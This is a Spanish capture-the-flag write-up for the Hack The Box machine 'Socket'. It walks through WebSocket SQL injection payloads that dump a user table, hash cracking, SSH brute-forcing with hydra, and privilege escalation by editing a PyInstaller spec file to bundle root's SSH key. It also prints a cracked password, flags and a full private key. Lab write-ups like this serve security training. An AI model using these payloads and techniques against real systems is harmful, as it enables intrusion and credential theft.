---
layout: post
title: Socket
date: 2023-07-27
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Socket-htb/Socket.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.206 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 22:30 GMT
Nmap scan report for 10.10.11.206
Host is up (0.078s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5789/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,5789 10.10.11.206 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 22:30 GMT
Nmap scan report for 10.10.11.206
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://qreader.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
5789/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 01 Jun 2023 16:57:49 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 01 Jun 2023 16:57:50 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 01 Jun 2023 16:58:08 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5789-TCP:V=7.93%I=7%D=6/1%Time=64791C11%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2001
SF:\x20Jun\x202023\x2016:57:49\x20GMT\r\nServer:\x20Python/3\.10\x20websoc
SF:kets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/plain\r\nC
SF:onnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20WebSocket\x20co
SF:nnection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x20request\.\n
SF:")%r(GetRequest,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Thu,
SF:\x2001\x20Jun\x202023\x2016:57:49\x20GMT\r\nServer:\x20Python/3\.10\x20
SF:websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/plai
SF:n\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20WebSocket
SF:\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x20reque
SF:st\.\n")%r(HTTPOptions,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\
SF:x20Thu,\x2001\x20Jun\x202023\x2016:57:50\x20GMT\r\nServer:\x20Python/3\
SF:.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20te
SF:xt/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20We
SF:bSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x
SF:20request\.\n")%r(RTSPRequest,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nDate:\x20Thu,\x2001\x20Jun\x202023\x2016:57:50\x20GMT\r\nServer:\x20Py
SF:thon/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type
SF::\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20
SF:a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x2
SF:0HTTP\x20request\.\n")%r(Help,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nDate:\x20Thu,\x2001\x20Jun\x202023\x2016:58:08\x20GMT\r\nServer:\x20Py
SF:thon/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type
SF::\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20
SF:a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x2
SF:0HTTP\x20request\.\n")%r(SSLSessionReq,F4,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x2016:58:08\x20GMT\r\nServ
SF:er:\x20Python/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nCon
SF:tent-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x2
SF:0open\x20a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x2
SF:0valid\x20HTTP\x20request\.\n");
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.62 seconds
```

Añado el dominio ```qreader.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.206
http://10.10.11.206 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.206], RedirectLocation[http://qreader.htb/], Title[301 Moved Permanently]
http://qreader.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@qreader.htb], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.206], JQuery[3.4.1], Python[3.10.6], Script[text/javascript], Werkzeug[2.1.2], X-UA-Compatible[ie=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Socket-htb/1.png" alt="">

Permite descargar una aplicación

<img src="/writeups/assets/img/Socket-htb/2.png" alt="">

Obtengo un comprimido llamado ```QReader_lin_v0.0.2.zip``` que contiene dos archivos, una imagen con un código QR y un binario

<img src="/writeups/assets/img/Socket-htb/3.png" alt="">

Como se está empleando ```Flask``` voy a suponer que el programa está hecho en python, aunque también se puede comprobar leyendo las cadenas de caracteres imprimibles

```null
strings qreader -n 60 | tail -n 3
xPyQt5/uic/widget-plugins/__pycache__/qtquickwidgets.cpython-310.pyc
xPyQt5/uic/widget-plugins/__pycache__/qtwebenginewidgets.cpython-310.pyc
xPyQt5/uic/widget-plugins/__pycache__/qtwebkit.cpython-310.pyc
```

Lo ejecuto y se abre una nueva interfaz

<img src="/writeups/assets/img/Socket-htb/4.png" alt="">

Genero un código QR desde la web

<img src="/writeups/assets/img/Socket-htb/5.png" alt="">

Al hacer click en ```About``` y ```version``` aparece un error de conexión

<img src="/writeups/assets/img/Socket-htb/6.png" alt="">

Me quedo en escucha con ```WireShark``` por todas las interfaces y obtengo un subdominio

<img src="/writeups/assets/img/Socket-htb/7.png" alt="">

Agrego ```ws.qreader.htb``` al ```/etc/hosts```. Tras hacer esto, puedo leer la versión que se está utilizando

<img src="/writeups/assets/img/Socket-htb/8.png" alt="">

Se está tramitando una petición por GET al ```WebSocket``` por el puerto ```5789``` en la ruta ```/version```

<img src="/writeups/assets/img/Socket-htb/9.png" alt="">

Lo replico con curl

```null
curl -s -X GET ws.qreader.htb:5789/version
Failed to open a WebSocket connection: empty Connection header.

You cannot access a WebSocket server directly with a browser. You need a WebSocket client.
```

Para poder tunelizarlo, modifico hago que el dominio apunte a mi equipo en vez de a la máquina víctima y desde ```BurpSuite``` agrego una configuración para que se redirija de nuevo

<img src="/writeups/assets/img/Socket-htb/10.png" alt="">

Desde el historial puedo ver y manipular las peticiones

<img src="/writeups/assets/img/Socket-htb/11.png" alt="">

Envío la petición al Repeater solicitando la versión

```null
{"version": "0.0.2"}
```

Recibo lo siguiente

```null
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

Introduzco una comilla simple al lado de la versión, y el servicio se corrompe

```null
{"message": "Invalid version!"}
```

Para conectarme desde la terminal, utilizo la herramienta [websocat](https://github.com/vi/websocat). Creo un archivo ```input``` que contiene la data que se quiere enviar, en este caso la versión

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

Creo un bucle para que se ejecute de forma indefinida

```null
while true; do ./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input; sleep 1; clear; done
```

Es vulnerable a inyección SQL. Al aplicar una selección de 4 columnas aparece una respuesta, en caso contrario no

```null
{"version": "0.0.2\" union select 1,2,3,4-- -"}
```

Se emplea ```SQLite3```. Para poder dumpear datos, cambié la versión de la ```0.0.2``` a ```0.0.1```. Tiene que ser diferente para que se pueda validar la sentencia

```null
{"version": "0.0.1\" union select 1,sqlite_version(),3,4-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "3.37.2", "released_date": 3, "downloads": 4}}
```

Listo las tablas

```null
catr input
{"version": "0.0.123\" union select 1,(select group_concat(name) from sqlite_master),3,4-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "sqlite_sequence,versions,users,info,reports,answers", "released_date": 3, "downloads": 4}}
```

Extraigo las columnas para todas las tablas

```null
catr input
{"version": "0.0.123\" union select 1,(select group_concat(sql) from sqlite_master),3,4-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER),CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT),CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT),CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE),CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))", "released_date": 3, "downloads": 4}}
```

Obtengo usuario y contraseña

```null
catr input
{"version": "0.0.123\" union select 1,username,password,role from users-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "admin", "released_date": "0c090c365fa0559b151a43e0fea39710", "downloads": "admin"}}
```

Crackeo el hash con ```john```

```null
ohn -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
denjanjade122566 (?)     
1g 0:00:00:00 DONE (2023-07-27 16:33) 3.571g/s 31003Kp/s 31003Kc/s 31003KC/s denlan2007..denisukeeciurly
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

No es válida por SSH. Dumpeo los datos de la tabla ```reports```

```null
catr input
{"version": "0.0.123\" union select 1,group_concat(reporter_name || subject || description),3,4 from reports-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "JasonAccept JPEG filesIs there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it?,MikeConverting non-ascii textWhen I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this.", "released_date": 3, "downloads": 4}}
```

Puedo ver más usuarios, obtengo los datos de la tabla con las respuestas

```null
catr input
{"version": "0.0.123\" union select 1,group_concat(id || answered_by || answer || answered_date),3,4 from answers-- -"}
```

```null
./websocat.x86_64-unknown-linux-musl ws://10.10.11.206:5789/version < input
{"message": {"id": 1, "version": "1adminHello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller17/08/2022,2adminHello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller25/09/2022", "released_date": 3, "downloads": 4}}
```

Con ```username-anarchy``` creo un diccionario de usuarios

```null
/opt/username-anarchy/username-anarchy Thomas Keller > users.txt
```

Obtengo uno válido a través de fuerza bruta por SSH

```null
hydra -L users.txt -p 'denjanjade122566' 10.10.11.206 ssh -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-28 12:56:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:15/p:1), ~4 tries per task
[DATA] attacking ssh://10.10.11.206:22/
[22][ssh] host: 10.10.11.206   login: tkeller   password: denjanjade122566
^[	1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-28 12:56:30
```

Me conecto y puedo ver la primera flag

```null
ssh tkeller@10.10.11.206
tkeller@10.10.11.206's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 28 12:56:12 PM UTC 2023

  System load:  0.080078125       Processes:             224
  Usage of /:   54.6% of 8.51GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.10.11.206
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jul 28 05:40:17 2023 from 10.10.16.16
tkeller@socket:~$ cat user.txt 
7fabce0bfd0bac5e13f157516233ffe3
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

Puedo leer el script

```null
tkeller@socket:~$ ls -l /usr/local/sbin/build-installer.sh
-rwxr-xr-x 1 root root 1096 Feb 17 11:41 /usr/local/sbin/build-installer.sh
```

```null
tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

Utilizo la función ```make``` y le paso un archivo ```.py``` sin contenido

```null
tkeller@socket:/tmp$ touch test.py
```

```null
tkeller@socket:/tmp$ sudo /usr/local/sbin/build-installer.sh make test.py 
167 INFO: PyInstaller: 5.6.2
168 INFO: Python: 3.10.6
174 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
175 INFO: wrote /tmp/qreader.spec
186 INFO: UPX is not available.
188 INFO: Extending PYTHONPATH with paths
['/tmp']
567 INFO: checking Analysis
568 INFO: Building Analysis because Analysis-00.toc is non existent
568 INFO: Initializing module dependency graph...
569 INFO: Caching module graph hooks...
573 WARNING: Several hooks defined for module 'numpy'. Please take care they do not conflict.
575 INFO: Analyzing base_library.zip ...
1662 INFO: Loading module hook 'hook-heapq.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
1768 INFO: Loading module hook 'hook-encodings.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
3277 INFO: Loading module hook 'hook-pickle.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
4860 INFO: Caching module dependency graph...
4966 INFO: running Analysis Analysis-00.toc
5004 INFO: Analyzing /tmp/test.py
5005 INFO: Processing module hooks...
5021 INFO: Looking for ctypes DLLs
5024 INFO: Analyzing run-time hooks ...
5026 INFO: Including run-time hook '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks/rthooks/pyi_rth_inspect.py'
5028 INFO: Including run-time hook '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks/rthooks/pyi_rth_subprocess.py'
5032 INFO: Looking for dynamic libraries
5508 INFO: Looking for eggs
5508 INFO: Python library not in binary dependencies. Doing additional searching...
5528 INFO: Using Python library /lib/x86_64-linux-gnu/libpython3.10.so.1.0
5530 INFO: Warnings written to /tmp/build/qreader/warn-qreader.txt
5545 INFO: Graph cross-reference written to /tmp/build/qreader/xref-qreader.html
5558 INFO: checking PYZ
5559 INFO: Building PYZ because PYZ-00.toc is non existent
5559 INFO: Building PYZ (ZlibArchive) /tmp/build/qreader/PYZ-00.pyz
5766 INFO: Building PYZ (ZlibArchive) /tmp/build/qreader/PYZ-00.pyz completed successfully.
5768 INFO: checking PKG
5768 INFO: Building PKG because PKG-00.toc is non existent
5768 INFO: Building PKG (CArchive) qreader.pkg
8225 INFO: Building PKG (CArchive) qreader.pkg completed successfully.
8227 INFO: Bootloader /root/.local/lib/python3.10/site-packages/PyInstaller/bootloader/Linux-64bit-intel/run
8227 INFO: checking EXE
8227 INFO: Building EXE because EXE-00.toc is non existent
8227 INFO: Building EXE from EXE-00.toc
8227 INFO: Copying bootloader EXE to /tmp/dist/qreader
8228 INFO: Appending PKG archive to custom ELF section in EXE
8269 INFO: Building EXE from EXE-00.toc completed successfully.
```

Esto crea un archivo ```qreader.spec```

```null
tkeller@socket:/tmp$ cat qreader.spec 
# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ['test.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='qreader',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
```

Se puede ver como el nombre ```test.py``` se encuentra hardcodeado en el código. Puedo crear una copia y modificarlo para que apunte a otro archivo, como la ```root.txt```

```null
tkeller@socket:/tmp$ cp qreader.spec /dev/shm/
tkeller@socket:/tmp$ cd !$
cd /dev/shm/
```

```null
tkeller@socket:/dev/shm$ sudo /usr/local/sbin/build-installer.sh build qreader.spec 
127 INFO: PyInstaller: 5.6.2
127 INFO: Python: 3.10.6
133 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
138 INFO: UPX is not available.
139 INFO: Extending PYTHONPATH with paths
['/root']
586 INFO: checking Analysis
586 INFO: Building Analysis because Analysis-00.toc is non existent
587 INFO: Initializing module dependency graph...
590 INFO: Caching module graph hooks...
599 WARNING: Several hooks defined for module 'numpy'. Please take care they do not conflict.
602 INFO: Analyzing base_library.zip ...
1647 INFO: Loading module hook 'hook-heapq.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
1774 INFO: Loading module hook 'hook-encodings.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
2968 INFO: Loading module hook 'hook-pickle.py' from '/root/.local/lib/python3.10/site-packages/PyInstaller/hooks'...
4375 INFO: Caching module dependency graph...
4485 INFO: running Analysis Analysis-00.toc
4515 INFO: Analyzing /root/root.txt

Syntax error in /root/root.txt
  File "/root/root.txt", line 1
     412ac87b165b0542647b710109e8690f
       ^
 SyntaxError: invalid decimal literal
```

Para ganar acceso, en el array datas también es posible añadir archivos en el array ```datas[]```

```null
datas=[('/root/.ss/id_rsa', '.')],
```

Tras volver a compilar, transfiero a mi equipo el archivo ```/opt/shared/build/qreader/qreader.pkg```. Con ```pyinstxtractor.py``` hago el proceso inverso

```null
python3 pyinstxtractor.py qreader.pkg
[+] Processing qreader.pkg
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 6462227 bytes
[+] Found 35 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: test.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: qreader.pkg

You can now use a python decompiler on the pyc files within the extracted directory
```

Puedo ver la ```id_rsa```

```null
ls
base_library.zip  libcrypto.so.3  liblzma.so.5		libssl.so.3		pyimod01_archive.pyc	pyi_rth_inspect.pyc	PYZ-00.pyz_extracted
id_rsa		 lib-dynload	 libmpdec.so.3		libz.so.1		pyimod02_importers.pyc  pyi_rth_subprocess.pyc  struct.pyc
libbz2.so.1.0	 libexpat.so.1   libpython3.10.so.1.0	pyiboot01_bootstrap.pyc  pyimod03_ctypes.pyc	PYZ-00.pyz		test.pyc
```

```null
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
7ovVxuzRSreg0AAAAKcm9vdEBncmFwaAE=
-----END OPENSSH PRIVATE KEY-----
```